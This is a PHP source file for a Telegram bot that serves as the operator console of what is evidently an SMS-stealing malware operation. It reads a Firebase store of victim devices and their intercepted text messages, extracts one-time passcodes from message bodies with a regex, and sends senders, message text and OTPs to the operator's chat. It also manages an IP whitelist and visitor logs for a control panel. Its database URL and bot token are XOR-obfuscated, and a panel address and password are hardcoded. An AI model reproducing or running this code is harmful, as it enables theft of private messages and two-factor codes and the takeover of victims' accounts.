<?php
error_reporting(0);
@ini_set('display_errors', 0);

define('ENC_KEY', 'AlexaAdmin2024!@#');
define('ENC_DB_URL', 'KRgRCBJ7S0IOCVVXVVMMeRR4DgFVBSQCDBwCRh1AQEUiDScFFx0DIBcIAAEcU11Z');
define('ENC_BOT_TOKEN', 'eVtRQFB4UVlYXAhxc3xRJkQLAgFMIhtUA1AnUHECDXAFSQ4rCi4JeAYUIVpXCA==');

function decrypt($e) {
  $d = base64_decode($e); $o = ''; $k = ENC_KEY; $l = strlen($k);
  for ($i = 0; $i < strlen($d); $i++) $o .= chr(ord($d[$i]) ^ ord($k[$i % $l]));
  return $o;
}

define('DB', decrypt(ENC_DB_URL));
define('BOT', decrypt(ENC_BOT_TOKEN));

function fb($p) {
  $ch = curl_init(DB . '/' . ltrim($p, '/') . '.json');
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_FOLLOWLOCATION => true]);
  $r = curl_exec($ch); curl_close($ch);
  return json_decode($r, true) ?: [];
}
function fbPut($p, $d) {
  $j = json_encode($d); $ch = curl_init(DB . '/' . ltrim($p, '/') . '.json');
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_CUSTOMREQUEST => 'PUT', CURLOPT_POSTFIELDS => $j, CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 8, CURLOPT_SSL_VERIFYPEER => false]);
  curl_exec($ch); curl_close($ch);
}
function tg($m, $d = []) {
  $j = json_encode($d); $ch = curl_init('https://api.telegram.org/bot' . BOT . '/' . $m);
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $j, CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 6, CURLOPT_SSL_VERIFYPEER => false]);
  $r = curl_exec($ch); curl_close($ch);
  return json_decode($r, true);
}
function send($id, $t, $e = []) {
  return tg('sendMessage', array_merge(['chat_id' => $id, 'text' => $t, 'parse_mode' => 'HTML'], $e));
}

// ====== WEBHOOK SETUP (visit bot.php?setup in browser) ======
if (isset($_GET['setup'])) {
  $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/bot.php';
  $r = tg('setWebhook', ['url' => $url]);
  header('Content-Type: application/json');
  echo json_encode(['status' => $r ? 'ok' : 'error', 'result' => $r, 'webhook_url' => $url]);
  exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) die('ok');

$msg = $input['message'] ?? [];
$cb = $input['callback_query'] ?? [];
$chatId = $msg['chat']['id'] ?? $cb['message']['chat']['id'] ?? 0;
$text = trim($msg['text'] ?? $cb['data'] ?? '');
$cbId = $cb['id'] ?? '';

if (!$chatId) die('ok');

// Register first user as owner
$owner = fb('panel/bot_chat_id');
if (!$owner) { fbPut('panel/bot_chat_id', $chatId); $owner = $chatId; }
$isOwner = ($owner == $chatId);

// Answer callback query immediately
if ($cbId) tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '⏳']);

// ====== COMMANDS ======
if ($text === '/start') {
  $kbd = ['inline_keyboard' => [
    [['text' => '📊 Devices', 'callback_data' => '/devices'], ['text' => '💬 SMS', 'callback_data' => '/sms']],
    [['text' => '📋 IP List', 'callback_data' => '/listips'], ['text' => '📡 Ping', 'callback_data' => '/ping']],
    [['text' => '👁️ Visitors', 'callback_data' => '/visitors'], ['text' => '🌐 Panel', 'url' => 'https://alexa01-1.onrender.com/panel.php']]
  ]];
  send($chatId, "🤖 <b>Alexa Admin Bot</b>\n\n"
    . "✅ Panel: https://alexa01-1.onrender.com/panel.php\n"
    . "🔑 Password: Alexa\n\n"
    . "📋 <b>Commands:</b>\n"
    . "/addip &lt;ip&gt; - Add IP\n"
    . "/removeip &lt;ip&gt; - Remove IP\n"
    . "/listips - Show IPs\n"
    . "/devices - Online/Offline\n"
    . "/sms - Fetch SMS\n"
    . "/ping - Panel ping\n"
    . "/visitors - Recent logs",
    ['reply_markup' => json_encode($kbd)]);
  die('ok');
}

// IP Management
$allowedIPs = fb('panel/allowed_ips');
if (!is_array($allowedIPs)) $allowedIPs = [];

if (preg_match('/^\/addip (.+)$/', $text, $m)) {
  $ip = trim($m[1]);
  if (!filter_var($ip, FILTER_VALIDATE_IP) && $ip !== '*') {
    send($chatId, "❌ Invalid IP: <code>$ip</code>"); die('ok');
  }
  if (in_array($ip, $allowedIPs)) {
    send($chatId, "⚠️ Already whitelisted: <code>$ip</code>"); die('ok');
  }
  $allowedIPs[] = $ip;
  fbPut('panel/allowed_ips', $allowedIPs);
  send($chatId, "✅ <b>IP Added!</b>\n<code>$ip</code>\nTotal: " . count($allowedIPs));
  die('ok');
}

if (preg_match('/^\/removeip (.+)$/', $text, $m)) {
  $ip = trim($m[1]);
  $k = array_search($ip, $allowedIPs);
  if ($k === false) { send($chatId, "❌ IP not found: <code>$ip</code>"); die('ok'); }
  unset($allowedIPs[$k]);
  fbPut('panel/allowed_ips', array_values($allowedIPs));
  send($chatId, "🗑️ <b>Removed!</b>\n<code>$ip</code>\nTotal: " . count($allowedIPs));
  die('ok');
}

if ($text === '/listips') {
  if (!$allowedIPs) { send($chatId, "📋 <b>Whitelist</b>\n\nNo IPs. Use /addip &lt;ip&gt;"); die('ok'); }
  $l = ''; foreach ($allowedIPs as $i => $ip) $l .= ($i+1) . ". <code>$ip</code>\n";
  send($chatId, "📋 <b>Whitelist</b> (" . count($allowedIPs) . ")\n\n$l",
    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/listips']]]])]);
  die('ok');
}

// Devices
if ($text === '/devices') {
  $raw = fb('user_data'); $on = 0; $off = 0; $bat = [];
  if (is_array($raw)) foreach ($raw as $id => $d) {
    if (!is_array($d)) continue;
    if (($d['status']??'') === 'online') { $on++; $bat[] = $d['battery']??0; } else $off++;
  }
  $avg = $bat ? round(array_sum($bat)/count($bat), 1) : 0;
  $txt = "📊 <b>Devices</b>\n📱 Total: " . ($on+$off) . "\n🟢 Online: <b>$on</b>\n🔴 Offline: <b>$off</b>\n🔋 Avg: {$avg}%";
  send($chatId, $txt, ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/devices']]]])]);
  die('ok');
}

// SMS
if ($text === '/sms') {
  send($chatId, "📩 Fetching SMS...");
  $raw = fb('user_sms'); $sms = [];
  if (is_array($raw)) foreach ($raw as $devId => $msgs) {
    if (!is_array($msgs)) continue;
    foreach ($msgs as $v) {
      if (!is_array($v)) continue;
      $s = $v['sender'] ?? $v['senderNumber'] ?? $v['from'] ?? $v['address'] ?? '';
      $b = $v['body'] ?? $v['msg'] ?? $v['message'] ?? $v['text'] ?? '';
      if (!$b) continue;
      $o = preg_match('/(?:OTP|code|verif|login|one.?time|otp)\s*(?::|is)?\s*(\d{4,8})/i', $b, $m) ? $m[1] : '';
      $sms[] = ['sender' => $s, 'body' => $b, 'otp' => $o];
    }
  }
  $total = count($sms); $otpC = count(array_filter($sms, fn($s) => !empty($s['otp'])));
  $txt = "📩 <b>SMS</b>\n💬 $total SMS\n🔑 $otpC OTPs\n\n📱 View in panel:\nhttps://alexa01-1.onrender.com/panel.php";
  $recent = array_slice(array_reverse($sms), 0, 5);
  if ($recent) {
    $txt .= "\n\n━━ <b>Recent 5</b> ━━";
    foreach ($recent as $s) {
      $bd = mb_substr($s['body'], 0, 60);
      $txt .= "\n👤 " . ($s['sender']?:'?') . "\n💬 " . htmlspecialchars($bd, ENT_QUOTES, 'UTF-8');
      if ($s['otp']) $txt .= "\n🔑 <b>OTP: {$s['otp']}</b>";
      $txt .= "\n━━━━";
    }
  }
  send($chatId, $txt, ['reply_markup' => json_encode(['inline_keyboard' => [
    [['text' => '📩 View All', 'url' => 'https://alexa01-1.onrender.com/panel.php']],
    [['text' => '🔄 Refresh', 'callback_data' => '/sms']]
  ]])]);
  die('ok');
}

// Ping
if ($text === '/ping') {
  $s = microtime(true); fb('panel/allowed_ips');
  $ms = round((microtime(true) - $s) * 1000);
  send($chatId, "📡 <b>Ping</b>\n⚡ {$ms}ms\n🐘 PHP " . PHP_VERSION . "\n🟢 Online",
    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/ping']]]])]);
  die('ok');
}

// Visitors
if ($text === '/visitors') {
  $v = fb('panel/visitors');
  if (!is_array($v) || !$v) { send($chatId, "📭 No visitors yet"); die('ok'); }
  $r = array_slice(array_reverse($v), 0, 10);
  $txt = "👁️ <b>Visitors</b> (last 10)\n\n";
  foreach ($r as $x) {
    $ip = $x['ip'] ?? '?'; $t = $x['time'] ?? '?';
    $a = ($x['allowed']??0) ? '✅' : '❌';
    $ua = htmlspecialchars(mb_substr($x['ua'] ?? '', 0, 25), ENT_QUOTES, 'UTF-8');
    $txt .= "$a <code>$ip</code>\n⏰ $t\n📱 $ua\n━━\n";
  }
  send($chatId, $txt,
    ['reply_markup' => json_encode(['inline_keyboard' => [[['text' => '🔄 Refresh', 'callback_data' => '/visitors']]]])]);
  die('ok');
}

// Callback button handler - just answer it
if ($cbId) die('ok');

send($chatId, "❓ Unknown\n/start for help");
die('ok');